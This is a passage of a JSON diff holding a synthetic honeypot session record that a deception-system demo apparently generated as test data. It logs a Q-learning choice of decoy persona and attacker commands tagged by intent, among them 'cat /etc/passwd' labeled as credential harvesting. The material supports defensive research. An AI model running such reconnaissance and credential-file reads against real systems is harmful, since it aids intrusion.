+    "pairPosition": 1,
+    "persona": "ubuntu_22",
+    "decision": {
+     "state": "centos_7",
+     "recommendedPersona": "ubuntu_22",
+     "appliedPersona": "ubuntu_22",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 136.3908,
+      "debian_11": 9.8803,
+      "centos_7": 17.5174,
+      "windows_srv": 1.6841,
+      "aws_ec2": 1.9778,
+      "raspberry_pi": 9.0565
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.901157+00:00",
+    "endedAt": "2026-11-11T19:21:48.901157+00:00",
+    "durationSeconds": 65,
+    "commands": [
+     {
+      "command": "uname -a",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "cat /etc/passwd",
+      "intent": "CREDENTIAL_HARVEST"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "completed",
+    "fingerprinted": false,
+    "reward": 6.4679
+   }
+  ]
+ },
+ "_note": "Generated by ai-engine/demo/deception_arena.py (real runner, dry-run). Seeded into the isolated e2e test database only."
+}
